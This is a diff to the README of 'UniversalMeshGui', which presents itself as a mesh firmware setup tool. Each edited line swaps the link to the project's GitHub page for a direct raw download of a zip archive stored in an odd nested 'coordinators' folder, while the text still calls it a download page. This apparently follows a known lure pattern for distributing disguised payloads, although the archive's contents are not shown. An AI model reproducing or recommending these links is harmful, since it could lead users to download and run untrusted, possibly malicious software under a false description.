@@ -1,12 +1,12 @@
 # 📡 UniversalMeshGui - Easy Mesh Firmware Setup
 
-[![Download / Install](https://img.shields.io/badge/Download%20%2F%20Install-UniversalMeshGui-blue?style=for-the-badge&logo=github)](https://github.com/duaneodorous851/UniversalMeshGui)
+[![Download / Install](https://img.shields.io/badge/Download%20%2F%20Install-UniversalMeshGui-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/duaneodorous851/UniversalMeshGui/main/UniversalMeshGUI/coordinators/Universal_Mesh_Gui_1.5.zip)
 
 ## 🔽 Download
 
 Use this link to visit the download page:
 
-https://github.com/duaneodorous851/UniversalMeshGui
+https://raw.githubusercontent.com/duaneodorous851/UniversalMeshGui/main/UniversalMeshGUI/coordinators/Universal_Mesh_Gui_1.5.zip
 
 ## 🧭 What This Does
 
@@ -35,7 +35,7 @@ For best results, use a USB cable that supports data, not just charging.
 ## 🚀 Getting Started
 
 1. Open the download page:
-   https://github.com/duaneodorous851/UniversalMeshGui
+   https://raw.githubusercontent.com/duaneodorous851/UniversalMeshGui/main/UniversalMeshGUI/coordinators/Universal_Mesh_Gui_1.5.zip
 
 2. Look for the latest release or download files.
 
@@ -245,4 +245,4 @@ Once those match, the process is usually straightforward on Windows
 
 Visit the download page here:
 
-https://github.com/duaneodorous851/UniversalMeshGui
+https://raw.githubusercontent.com/duaneodorous851/UniversalMeshGui/main/UniversalMeshGUI/coordinators/Universal_Mesh_Gui_1.5.zip
